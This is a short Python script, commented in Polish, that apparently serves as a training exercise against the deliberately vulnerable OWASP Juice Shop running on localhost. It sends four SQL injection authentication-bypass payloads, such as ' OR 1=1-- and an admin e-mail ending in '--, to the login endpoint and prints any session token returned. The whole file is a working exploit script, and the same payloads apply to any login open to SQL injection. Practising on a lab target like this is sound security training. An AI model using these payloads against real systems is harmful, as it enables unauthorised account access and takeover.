import requests

# Link do OWASP Juice-Shop
url = "http://localhost:3000/rest/user/login"

# Przykładowe payloady SQLi na login w formacie json
payloads = [
    {"email": "' OR 1=1--", "password": "cokolwiek"},
    {"email": "admin@juice-sh.op", "password": "' OR '1'='1"},
    {"email": "' OR '1'='1", "password": "' OR '1'='1"},
    {"email": "admin@juice-sh.op'--", "password": "abcd"},
]

headers = {'Content-Type': 'application/json'}

# Przesyłanie zapytań post z payloadami
for i, payload in enumerate(payloads):
    print(f"\n[Test {i + 1}] Próba logowania z Email: {payload['email']} Hasło: {payload['password']}")
    response = requests.post(url, json=payload, headers=headers)

    # Jeśli zwraca status code 200 sprawdź czy jest token
    if response.status_code == 200:
        if "authentication" in response.text or "token" in response.text:
            print("[+] Sukces! Token zwrócony.")
            print("Token:", response.json().get("authentication", {}).get("token"))
        else:
            print("[!] 200 OK, ale brak tokena. Sprawdź odpowiedź:")
            print(response.text[:200])

    # W innym wypadku wyświetl status code
    else:
        print(f"[-] Kod odpowiedzi: {response.status_code}. Treść: {response.text[:100]}")
